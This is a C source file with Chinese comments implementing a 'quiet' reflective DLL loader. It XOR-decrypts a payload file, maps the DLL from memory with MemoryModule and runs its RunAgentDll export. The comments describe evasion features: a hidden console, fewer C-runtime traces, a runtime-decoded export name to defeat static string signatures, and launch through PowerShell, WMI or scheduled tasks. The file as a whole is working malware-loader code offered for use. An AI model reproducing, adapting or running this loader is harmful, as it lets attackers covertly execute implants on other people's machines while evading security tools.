#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include "MemoryModule.h"

// 文件作用：quiet 版 direct_https DLL 内存加载器。
// 和 loader_agentdll_encrypted.c 的功能一样：读取加密 bin、XOR 解密、用
// MemoryModule 从内存加载 DLL、调用 RunAgentDll()。
//
// 区别：
// 1. 不向 stdout/stderr 打印调试字符串，适合用 PowerShell Start-Process
//    无重定向方式测试父进程链路。
// 2. 默认按 GUI subsystem 构建，不弹 console 窗口。
// 3. WinAPI 读文件，减少 C runtime stdio 痕迹。
// 4. 关键字符串运行时解码，降低静态字符串差异对实验的干扰。

typedef DWORD (WINAPI *RunAgentDllFn)(void);

#ifndef QUIET_XOR_KEY
#define QUIET_XOR_KEY "CHANGE_ME_MEMORY_LOADER_KEY"
#endif

// heap_alloc：用进程默认堆申请内存，减少对 C runtime malloc 的依赖。
static void* heap_alloc(SIZE_T size)
{
    return HeapAlloc(GetProcessHeap(), 0, size);
}

// heap_free：释放 heap_alloc 申请的内存。
static void heap_free(void* ptr)
{
    if (ptr) HeapFree(GetProcessHeap(), 0, ptr);
}

// read_file_winapi：用 WinAPI 读取 payload bin。
// quiet loader 常在 PowerShell/WMI/计划任务下启动，使用 WinAPI 方便保持行为简单稳定。
static int read_file_winapi(const char* path, unsigned char** outBuf, DWORD* outSize)
{
    HANDLE h = INVALID_HANDLE_VALUE;
    LARGE_INTEGER li;
    DWORD size = 0;
    DWORD readTotal = 0;
    unsigned char* buf = NULL;

    if (!path || !outBuf || !outSize) return 1;
    *outBuf = NULL;
    *outSize = 0;

    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 2;

    if (!GetFileSizeEx(h, &li) || li.QuadPart <= 0 || li.QuadPart > 128 * 1024 * 1024) {
        CloseHandle(h);
        return 3;
    }
    size = (DWORD)li.QuadPart;
    buf = (unsigned char*)heap_alloc(size);
    if (!buf) {
        CloseHandle(h);
        return 4;
    }

    while (readTotal < size) {
        DWORD got = 0;
        DWORD want = size - readTotal;
        if (!ReadFile(h, buf + readTotal, want, &got, NULL) || got == 0) {
            heap_free(buf);
            CloseHandle(h);
            return 5;
        }
        readTotal += got;
    }

    CloseHandle(h);
    *outBuf = buf;
    *outSize = size;
    return 0;
}

// xor_crypt：把 cache/bin 还原成 DLL 字节。
// 这里和 pack_xor.py 使用同一个 key，处理两次即可恢复原文。
static void xor_crypt(unsigned char* buf, DWORD size, const char* key)
{
    DWORD keyLen = key ? (DWORD)strlen(key) : 0;
    if (!buf || !size || !keyLen) return;
    for (DWORD i = 0; i < size; i++) {
        buf[i] ^= (unsigned char)key[i % keyLen];
    }
}

// decode_export_name：还原导出函数名 RunAgentDll。
// 这样 loader 源码里不会直接出现明文导出名，便于做单变量字符串实验。
static void decode_export_name(char* out, DWORD outSize)
{
    // "RunAgentDll" ^ 0x5a
    static const unsigned char enc[] = {
        0x08, 0x2f, 0x34, 0x1b, 0x3d, 0x3f, 0x34, 0x2e, 0x1e, 0x36, 0x36, 0x00
    };
    DWORD n = sizeof(enc);
    if (!out || outSize < n) return;
    for (DWORD i = 0; i < n - 1; i++) out[i] = (char)(enc[i] ^ 0x5a);
    out[n - 1] = 0;
}

// run_loader：quiet loader 的核心流程。
// 读 bin -> XOR 解密 -> MemoryLoadLibrary 手动映射 -> 找 RunAgentDll -> 进入 AgentMain。
static int run_loader(const char* binPath, const char* key)
{
    unsigned char* payload = NULL;
    DWORD payloadSize = 0;
    HMEMORYMODULE module = NULL;
    RunAgentDllFn runAgent = NULL;
    char exportName[16] = {0};
    DWORD rc = 0;

    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
    FreeConsole();

    rc = (DWORD)read_file_winapi(binPath, &payload, &payloadSize);
    if (rc != 0) return 10 + (int)rc;

    xor_crypt(payload, payloadSize, key);
    if (payloadSize < 2 || payload[0] != 'M' || payload[1] != 'Z') {
        heap_free(payload);
        return 20;
    }

    module = MemoryLoadLibrary(payload, payloadSize);
    if (!module) {
        heap_free(payload);
        return 30;
    }

    decode_export_name(exportName, sizeof(exportName));
    runAgent = (RunAgentDllFn)MemoryGetProcAddress(module, exportName);
    if (!runAgent) {
        MemoryFreeLibrary(module);
        heap_free(payload);
        return 40;
    }

    rc = runAgent();

    MemoryFreeLibrary(module);
    heap_free(payload);
    return (int)rc;
}

// main：参数解析入口。
// argv[1] 是 payload bin 路径，argv[2] 是 XOR key；没有参数时使用默认文件名和默认 key。
int main(int argc, char** argv)
{
    const char* binPath = argc > 1 ? argv[1] : "cache.dat";
    const char* key = argc > 2 ? argv[2] : QUIET_XOR_KEY;
    return run_loader(binPath, key);
}
